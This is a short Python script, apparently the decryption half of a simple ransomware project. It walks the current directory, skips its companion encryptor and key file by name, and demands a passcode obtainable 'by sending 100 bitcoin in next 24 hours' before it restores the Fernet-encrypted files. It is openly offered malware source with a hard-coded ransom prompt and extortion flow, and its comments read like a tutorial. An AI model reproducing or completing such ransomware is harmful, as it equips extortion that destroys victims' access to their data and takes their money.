import os
from cryptography.fernet import Fernet
#fernet is a  method of cryptography module which is used to encrypt the 
#files.
#finding files - to see all files in current directory. listdir method is used
# from OS module.
files=[]
for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key" or file=="decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

with open("thekey.key","rb") as f:
	mykey=f.read()

secret="Iamadangeroushacker"
var=input("Enter the correct Passcode to Decrypt your files. The Passcode can only be achieved by sending 100 bitcoin in next 24 hours.")
if var==secret:
	#the below for loop will decrypt all files.
	for file in files:
		with open(file,"rb") as f:
			contents=f.read()
		decrypted_contents=Fernet(mykey).decrypt(contents)
		with open(file,"wb") as f:
			f.write(decrypted_contents)
	print("Your Files have been sucessfully Decrypted!!! enjoy :)")
else:
	print("Sorry, Wrong Passcode. send more Bitcoin.:[ ")
